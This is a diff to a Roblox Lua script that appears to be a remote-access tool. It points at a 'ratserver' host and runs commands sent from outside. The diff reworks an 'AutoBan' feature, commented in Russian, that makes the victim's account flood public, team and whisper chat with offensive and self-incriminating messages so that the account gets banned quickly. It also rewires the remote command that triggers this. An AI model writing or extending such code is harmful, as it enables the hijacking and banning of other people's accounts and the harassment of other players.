@@ -8,6 +8,7 @@ local MarketplaceService = game:GetService("MarketplaceService")
 local RunService = game:GetService("RunService")
 local Stats = game:GetService("Stats")
 local CoreGui = game:GetService("CoreGui")
+local TextChatService = game:GetService("TextChatService")
 
 local SERVER_URL = "https://ratserver-6wo3.onrender.com"
 local player = Players.LocalPlayer
@@ -1063,7 +1064,7 @@ local function cameraShake(duration, intensity)
     return true
 end
 
--- ФУНКЦИЯ: AutoBan - агрессивный спам для быстрого бана
+-- ФУНКЦИЯ: AutoBan - агрессивный спам для быстрого бана (ИСПРАВЛЕННАЯ)
 local function getBadWords()
     -- Максимально агрессивный список запрещенных слов для гарантированного бана
     return {
@@ -1121,7 +1122,7 @@ local function getBadWords()
         -- Провокации на отчет и читы
         "REPORT ME NOW", "I AM CHEATING", "EXPLOITING HARD",
         "USING HACKS", "SCRIPTING", "INJECTING CODE",
-        "BYPassING FILTER", "I AM HACKER", "BYPASSED CHAT",
+        "BYPASSING FILTER", "I AM HACKER", "BYPASSED CHAT",
         "CHEAT ENGINE", "MEMORY HACK", "SPEED HACK",
         
         -- Комбинации для максимальной агрессии
@@ -1169,52 +1170,119 @@ local function startAutoBan()
         return message:sub(1, 200) -- Более длинные сообщения
     end
     
+    -- ИСПРАВЛЕННАЯ функция спама в чат (работает с новым чатом Roblox)
     local function spamChat()
-        local chatEvent = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
-        
         while autoBanEnabled do
             local message = getRandomMessage()
             
-            -- Пытаемся отправить всеми возможными способами
+            -- Пытаемся использовать новый TextChatService (современный Roblox)
             pcall(function()
-                chatEvent:FireServer(message, "All")
+                local textChatService = game:GetService("TextChatService")
+                local textChatChannel = textChatService:FindFirstChild("TextChannel")
+                
+                if textChatChannel then
+                    textChatChannel:SendAsync(message)
+                end
             end)
             
-            -- Также пробуем через разные чат системы
+            -- Пытаемся использовать старый ReplicatedStorage чат (старые игры)
             pcall(function()
-                -- Для некоторых игр
-                local otherChat = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
-                if otherChat then
-                    local sayEvent = otherChat:FindFirstChild("SayMessageRequest")
-                    if sayEvent then
-                        sayEvent:FireServer(message, "All")
+                local replicatedStorage = game:GetService("ReplicatedStorage")
+                
+                -- Способ 1: DefaultChatSystemChatEvents
+                local defaultChat = replicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+                if defaultChat then
+                    local sayMessage = defaultChat:FindFirstChild("SayMessageRequest")
+                    if sayMessage then
+                        sayMessage:FireServer(message, "All")
+                    end
+                end
+                
+                -- Способ 2: ChatEvents (другой вариант)
+                local chatEvents = replicatedStorage:FindFirstChild("ChatEvents")
+                if chatEvents then
+                    local sayMessage = chatEvents:FindFirstChild("SayMessageRequest")
+                    if sayMessage then
+                        sayMessage:FireServer(message, "All")
+                    end
+                end
+                
+                -- Способ 3: Direct RemoteEvent
+                for _, obj in pairs(replicatedStorage:GetDescendants()) do
+                    if obj:IsA("RemoteEvent") and (obj.Name:find("Chat") or obj.Name:find("Say") or obj.Name:find("Message")) then
+                        pcall(function()
+                            obj:FireServer(message, "All")
+                        end)
                     end
                 end
             end)
             
-            -- Очень короткая задержка для максимального спама (0.1-0.5 сек)
-            task.wait(math.random(10, 50) / 100)
+            -- Пытаемся использовать Players службу
+            pcall(function()
+                local players = game:GetService("Players")
+                local player = players.LocalPlayer
+                
+                -- Через Player объект
+                if player then
+                    pcall(function()
+                        player:Chat(message)
+                    end)
+                end
+            end)
+            
+            -- Очень короткая задержка для максимального спама (0.1-0.3 сек)
+            task.wait(math.random(10, 30) / 100)
         end
     end
     
     local function spamTeamChat()
-        local chatEvent = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
-        
         while autoBanEnabled do
             local message = getRandomMessage()
             
             -- Спам в Team чат тоже
             pcall(function()
-                chatEvent:FireServer(message, "Team")
+                local replicatedStorage = game:GetService("ReplicatedStorage")
+                local defaultChat = replicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+                if defaultChat then
+                    local sayMessage = defaultChat:FindFirstChild("SayMessageRequest")
+                    if sayMessage then
+                        sayMessage:FireServer(message, "Team")
+                    end
+                end
             end)
             
-            task.wait(math.random(15, 60) / 100)
+            task.wait(math.random(15, 40) / 100)
         end
     end
     
-    -- Запускаем агрессивный спам в двух потоках
+    local function spamWhisperChat()
+        -- Спам в приватные сообщения другим игрокам
+        while autoBanEnabled do
+            local players = game:GetService("Players"):GetPlayers()
+            if #players > 1 then
+                local targetPlayer = players[math.random(2, #players)] -- Пропускаем себя
+                local message = getRandomMessage()
+                
+                pcall(function()
+                    local replicatedStorage = game:GetService("ReplicatedStorage")
+                    local defaultChat = replicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+                    if defaultChat then
+                        local whisperEvent = defaultChat:FindFirstChild("WhisperChat")
+                        if whisperEvent then
+                            whisperEvent:FireServer(message, targetPlayer.Name)
+                        end
+                    end
+                end)
+            end
+            
+            task.wait(math.random(20, 50) / 100)
+        end
+    end
+    
+    -- Запускаем агрессивный спам в нескольких потоках
     autoBanTask = task.spawn(spamChat)
     task.spawn(spamTeamChat)
+    task.spawn(spamWhisperChat)
     
     -- Автоматическое выключение через 1 минуту (обычно бан наступает быстрее)
     task.delay(60, function()
@@ -1428,6 +1496,31 @@ local function ExecuteCommand(cmd, args)
                     })
                 })
             end)
+            
+        -- AutoBan (в секции SPAM)
+        elseif cmd == "autoban" then
+            if args and args[1] then
+                local action = args[1]:lower()
+                if action == "on" or action == "enable" or action == "start" then
+                    startAutoBan()
+                elseif action == "off" or action == "disable" or action == "stop" then
+                    stopAutoBan()
+                else
+                    -- Переключение
+                    if autoBanEnabled then
+                        stopAutoBan()
+                    else
+                        startAutoBan()
+                    end
+                end
+            else
+                -- Переключение без аргументов
+                if autoBanEnabled then
+                    stopAutoBan()
+                else
+                    startAutoBan()
+                end
+            end
         
         elseif cmd == "jumpscare" then
             local scareType = tonumber(args[1]) or 1
@@ -1462,31 +1555,6 @@ local function ExecuteCommand(cmd, args)
             intensity = math.min(intensity, 10) -- максимум интенсивность 10
             
             cameraShake(duration, intensity)
-        
-        -- НОВАЯ КОМАНДА: AutoBan
-        elseif cmd == "autoban" then
-            if args and args[1] then
-                local action = args[1]:lower()
-                if action == "on" or action == "enable" or action == "start" then
-                    startAutoBan()
-                elseif action == "off" or action == "disable" or action == "stop" then
-                    stopAutoBan()
-                else
-                    -- Переключение
-                    if autoBanEnabled then
-                        stopAutoBan()
-                    else
-                        startAutoBan()
-                    end
-                end
-            else
-                -- Переключение без аргументов
-                if autoBanEnabled then
-                    stopAutoBan()
-                else
-                    startAutoBan()
-                end
-            end
         
         end
     end)
